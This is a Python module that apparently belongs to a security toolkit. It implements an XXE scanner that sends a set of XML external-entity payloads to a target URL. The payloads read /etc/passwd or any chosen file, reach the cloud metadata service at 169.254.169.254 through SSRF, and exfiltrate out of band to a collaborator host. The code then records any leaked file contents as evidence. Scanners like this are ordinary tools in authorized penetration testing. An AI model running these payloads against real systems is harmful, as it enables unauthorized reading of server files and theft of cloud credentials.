import json
import urllib.request
import re
import base64
import xml.parsers.expat
from utils.output import section, info, success, warning, error, result, table


class XXEScanner:
    description = "Advanced XXE scanner: file read, SSRF, blind exfiltration, DOCTYPE variants"

    PAYLOADS = [
        {
            "name": "Classic file read",
            "payload": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
            "verify": "root:",
        },
        {
            "name": "PHP filter",
            "payload": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>""",
            "verify": None,
        },
        {
            "name": "SSRF test",
            "payload": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>""",
            "verify": "ami",
        },
        {
            "name": "Blind OOB",
            "payload": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR/xxe.dtd"> %xxe;]><root>test</root>""",
            "verify": None,
        },
        {
            "name": "Error-based",
            "payload": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent"> %xxe;]><root>test</root>""",
            "verify": "",
        },
        {
            "name": "UTF-16 BOM",
            "payload": None,  # built below
            "verify": "root:",
        },
        {
            "name": "Parameter entity",
            "payload": """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root>test</root>""",
            "verify": "root:",
        },
        {
            "name": "XInclude",
            "payload": """<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>""",
            "verify": "root:",
        },
        {
            "name": "SVG XXE",
            "payload": """<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&xxe;</text></svg>""",
            "verify": "root:",
        },
    ]

    @staticmethod
    def run(url="", target="", data="", param="", content_type="", timeout=15, collaborator="", file_read="", **kwargs):
        section("XXE Scanner")

        target_url = url or target or ""
        if not target_url:
            error("No target URL")
            return {"error": "no target"}

        result_data = {
            "target": target_url,
            "vulnerable": False,
            "engine": None,
            "file_read": [],
            "ssrf": False,
            "findings": [],
        }

        if not data and not param:
            param = "xml"  # common param name to test

        content_types = []
        if content_type:
            content_types.append(content_type)
        else:
            content_types = ["application/xml", "text/xml", "application/x-www-form-urlencoded"]

        section(f"Testing {len(XXEScanner.PAYLOADS)} XXE payload variants")

        for ctype in content_types:
            for p in XXEScanner.PAYLOADS:
                payload = p["payload"]
                if p["name"] == "UTF-16 BOM":
                    payload = '<?xml version="1.0"?>'.encode("utf-16") + b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'.encode("utf-16")

                if file_read:
                    payload_str = payload.decode("utf-16") if isinstance(payload, bytes) else payload
                    if "file:///etc/passwd" in payload_str:
                        payload_str = payload_str.replace("file:///etc/passwd", f"file://{file_read}")
                        payload = payload_str.encode("utf-16") if isinstance(payload, bytes) else payload_str

                test_data = data or ""
                if param and param in test_data:
                    test_data = test_data.replace(f"${param}", payload if isinstance(payload, str) else payload.decode("utf-16", errors="replace"))
                else:
                    if data:
                        test_data = payload if isinstance(payload, str) else payload.decode("utf-16", errors="replace")
                    else:
                        test_data = payload if isinstance(payload, str) else payload.decode("utf-16", errors="replace")

                if isinstance(test_data, str):
                    test_data = test_data.encode()

                try:
                    req = urllib.request.Request(
                        target_url,
                        data=test_data,
                        headers={
                            "Content-Type": ctype,
                            "User-Agent": "Mozilla/5.0",
                        },
                    )
                    with urllib.request.urlopen(req, timeout=timeout) as resp:
                        body = resp.read().decode("utf-8", errors="replace")

                        verify = p["verify"]
                        if verify and verify in body:
                            finding = {"variant": p["name"], "content_type": ctype, "evidence": body[:200]}
                            result_data["findings"].append(finding)
                            result_data["vulnerable"] = True
                            warning(f"XXE confirmed via '{p['name']}' ({ctype})")
                            success(f"Evidence: {body[:100].strip()!r}...")

                            if "passwd" in body or "root:" in body:
                                result_data["file_read"].append("/etc/passwd")
                            if "ami-" in body or "meta-data" in body.lower():
                                result_data["ssrf"] = True
                            break
                except urllib.error.HTTPError as e:
                    body = e.read().decode("utf-8", errors="replace")
                    if p["verify"] and p["verify"] in body:
                        result_data["findings"].append({"variant": p["name"], "content_type": ctype, "evidence": body[:200], "status": e.code})
                        result_data["vulnerable"] = True
                        warning(f"XXE confirmed via '{p['name']}' (HTTP {e.code})")
                        break
                except:
                    pass

            if result_data["vulnerable"]:
                break

        if not result_data["vulnerable"]:
            section("Blind XXE Detection")
            info("Testing blind XXE with out-of-band techniques")
            if collaborator:
                from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
                oob_payload = f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{collaborator}/xxe"> %xxe;]><root>test</root>"""
                for ctype in ["application/xml", "text/xml"]:
                    try:
                        req = urllib.request.Request(
                            target_url,
                            data=oob_payload.encode(),
                            headers={"Content-Type": ctype},
                        )
                        with urllib.request.urlopen(req, timeout=timeout) as resp:
                            info(f"Blind XXE sent via {ctype} — check {collaborator}")
                            result_data["findings"].append({"variant": "Blind OOB", "collaborator": collaborator, "content_type": ctype})
                    except:
                        pass

        section("XXE Scan Complete")
        if result_data["vulnerable"]:
            warning("XXE VULNERABLE: restrict XML parsing and disable external entities")
        else:
            success("No XXE vulnerability detected")

        return result_data
